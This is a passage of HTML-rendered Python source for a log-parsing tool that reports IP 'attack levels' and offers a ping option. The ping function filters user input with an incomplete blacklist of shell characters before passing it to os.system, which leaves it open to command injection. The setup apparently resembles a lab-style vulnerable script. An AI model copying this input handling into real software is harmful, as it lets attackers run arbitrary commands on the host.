&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; - Attack Level : &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;level&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;date_to_num&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lines&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;dat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;lines&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Level&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;fecha&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;regex&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;(\d+)-(.*)-(\d+)(.*)&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;logEx&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;regex&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fecha&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;groups&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;mes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;to_dict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;logEx&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;fecha&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;logEx&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;mes&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;logEx&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;logEx&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;fecha&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strptime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fecha&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;%Y-%m-&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s1"&gt; %H:%M:%S&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;fecha&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;dat&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;dat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fecha&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;req&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;dat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;to_dict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;month_dict&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Jan&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;01&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Feb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;02&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Mar&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;03&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Apr&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;04&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;May&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;05&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Jun&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;06&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Jul&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;07&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Aug&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;08&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Sep&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;09&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Oct&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;10&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Nov&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;11&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Dec&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;12&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;month_dict&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_max_level&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lines&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;lines&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Level&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;level&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;level&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;level&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;exec_ping&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;forbidden&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;amp;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;`&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;||&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Enter an IP: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;forbidden&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Got you&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ping &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;show_header&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;show_help&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;-h&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;--help&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;show_help&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;-s&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;show_statistics&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;-l&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;list_ip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;-p&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;exec_ping&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;show_help&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
